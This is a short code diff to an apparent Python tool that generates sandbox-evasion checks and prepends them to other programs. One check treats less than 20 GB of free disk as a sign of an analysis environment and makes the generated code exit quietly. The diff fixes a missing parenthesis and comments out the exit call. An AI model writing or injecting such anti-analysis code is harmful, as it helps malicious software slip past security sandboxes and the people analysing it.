@@ -297,6 +297,7 @@ def check_environment():
                     None, 
                     None, 
                     ctypes.pointer(free_bytes)
+                )
                 if free_bytes.value < 21474836480:  # 20 GB
                     return False
             except:
@@ -337,9 +338,9 @@ def check_environment():
     return True
 
 # Execute evasion checks
-if not check_environment():
-    import sys
-    sys.exit(0)
+# if not check_environment():
+#     import sys
+#     sys.exit(0)
 """)
     
     # Combine all evasion code and prepend to the original code
